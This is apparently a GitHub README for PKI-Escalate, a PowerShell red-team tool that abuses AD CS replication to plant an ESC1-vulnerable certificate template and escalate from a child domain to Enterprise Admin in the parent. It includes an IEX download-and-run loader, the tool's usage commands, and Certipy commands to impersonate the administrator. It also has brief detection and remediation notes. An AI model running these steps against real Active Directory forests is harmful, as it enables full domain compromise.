# PKI-Escalate

## Overview

PKI-Escalate is a tool designed to abuse the overly permissive relationship between CHILD and PARENT domains in regard to their certificate services containers within Active Directory. Modifications at the CHILD domain are propagated up to the PARENT domain, which can lead to the SYSTEM user in the CHILD domain being able to add a malicious certificate template, vulnerable to [ESC1](https://linl.cok), for a user of their choosing. This then gets replicated up to the PARENT domain, and thus, a certificate can be requested against the PARENT DC as any user, including Enterprise Administrators. 

Initially, I read about this technique on Andy Robbins Spectre Ops post - [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) - which you should definitely check out! It goes into detail about how and why this attack is possible. I've provided a small overview below for more TLDR folks.

- Changes made to the CHILD domain objects related to the certificate service are replicated up to the PARENT domain.
- Certificate Templates are stored in the AD object `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=DomainName,DC=Tld`.
- Published Certificate Templates, that is, those that are useable, are stored in the `certificateTemplates` value of the `CN=CAName,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=DomainName,DC=Tld` container.
- Both of these are children of the `CN=Public Key Services,CN=Services,CN=Configuration,DC=DomainName,DC=Tld` container. In the CHILD domain, the SYSTEM user has FULL CONTROL of this container. By default, there is no inheritance to the Enrollment Services container, restricting the ability to publish certificates, but with full control of the PARENT, we can add this.
- Changes made to this container by the SYSTEM user in the CHILD domain will be replicated up to the PARENT domain!

In essence, this allows us to:
 - Copy an existing, published template and modify it to be vulnerable to ESC1 (Enrolee supplies SAN in the certificate request).
 - Insert this template into the Certificate Templates container, so it is available for publishing.
 - Publish the certificate, allowing an arbitrary user in the CHILD domain to request certificates as any domain user in the parent domain.
 - Escalate from SYSTEM in the CHILD domain to Enterprise Administrator in the PARENT domain 😊

Vadims Podāns ([@Crypt32](https://twitter.com/Crypt32)) then provided the [method](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) to perform the attack in an environment without ADCS installed, which involves installing the ADCS services on the CHILD domain and waiting for it to be replicated up the PARENT.

Both environments have been included for this initial release of the tool, though there are some caveats to be aware of in the [Limitations](https://github.com/heartburn-dev/PKI-Escalate#Limitations) section.

## Installation

PKI-Escalate is provided as a simple PowerShell script which can be imported:

```powershell
Import-Module .\PKI-Escalate.ps1
```

As with most things, it can also be loaded remotely into memory:
```powershell
IEX((New-Object System.Net.WebClient).downloadString('https://raw.githubusercontent.com/heartburn-dev/PKI-Escalate/master/PKI-Escalate.ps1))
```

## Usage Instructions

To escalate the user GANON and add a malicious certificate template called BADBOY:
```powershell
Invoke-Escalation -Username GANON -TemplateName BADBOY 
```

To escalate the user GANON and add a malicious certificate template called BADBOY to a domain without ADCS installed:
```powershell
Invoke-Escalation -Username GANON -TemplateName BADBOY -InstallAdcs -CAName NewCA
```

To remove a template that was installed using the exploit:
```powershell
Clear-Template -TemplateName BADBOY -CAName NewCA
```

Once exploited, consider using either Certipy or Certify to abuse the new template:
```bash
# Check the vulnerable templates - If LDAPs is properly configured then the scheme is not necessary
certipy find -vulnerable -scheme ldap -u ganon -p Password1 -dc-ip 192.168.55.25

# Request a certificate as the administrator user in the parent domain
certipy req -username ganon@chasm.dc01.hyrule.local -ca 'HYRULE-CA' -target HYRULE-ADCS.HYRULE.LOCAL -template BADBOY -upn administrator@HYRULE.LOCAL  -password Password1 -debug

# Authenticate to the parent domain as the administrator
certipy auth -pfx administrator.pfx -dc-ip 192.168.55.5
```

⚠ **NOTE**: When requesting your certificate with Certipy, the `-target` parameter points to the certificate server. This is because it connects via the `ncacn_np:\\HOSTNAME[\pipe\cert]` pipe to request information! ⚠

Please consider clicking on the image below to watch a demonstration video:

[![PKI-Escalate Demonstration - Domain Admin to Enterprise Admin](https://img.youtube.com/vi/XtwKvZ-kZRE/0.jpg)](http://www.youtube.com/watch?v=XtwKvZ-kZRE "PKI-Escalate Demonstration - Domain Admin to Enterprise Admin")

Alternatively, a direct link is:

https://www.youtube.com/watch?v=XtwKvZ-kZRE


## OPSEC Considerations

In terms of remediation, I don't have much information on this attack as I believe this functionality is inherent to the way ADCS works within a forest environment. That is to say, replication up and down is a necessity to allow CA functionality across domains. However, removing full control from the SYSTEM user, or disabling inheritance on the `CN=CAName,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=DomainName,DC=Tld` container may stop a TA from being able to enable the certificate. 

A better use of time may be to concentrate on detection. Certificate Template changes are not everyday things that occur in an Active Directory environment and therefore deletions and additions should be closely monitored.

## Limitations

This tool was tested in three lab environments:

- ADCS installed on a dedicated ADCS machine in the PARENT domain;
- ADCS installed on the PARENT Domain Controller;
- ADCS not installed and performed as part of the script.

These were all Windows Server 2019 machines. Further testing is yet to be conducted on larger environments and different setups. For these, it is recommended to perform the attacks manually if the tool fails to handle an error. Please submit a pull request or issue if you encounter problems and I will endeavour to fix it. 

## Errors

During testing, I noted multiple errors and their corresponding reasons:


The exploit completes, but the resulting certificate cannot be used and returns `"KDC_ERROR_CLIENT_NOT_TRUSTED"`. This generally occurred as the ADCS had been installed recently and there was a time delay between the certificates being able to be used for authentication. Please bear this in mind for testing labs!


Similarly, the error `"KDC_ERR_PADATA_TYPE_NOSUPP"` was encountered, also a byproduct of just a recent install. This, I believe, is due to the PARENT DC not yet enrolling for a certificate that allows smartcard logons.


Both these errors should only occur in environments when you are testing and have recently installed the required services. Just give it a few hours and the certificates should be fine to authenticate with after 😊


## TODO List

- [x] Add the ability to completely remove the template rather than just unpublish
- [ ] Create a CSharp version
- [ ] Create BOF version
- [ ] Add handling for multiple CAs being installed
- [ ] Test on 2012/2016/2022
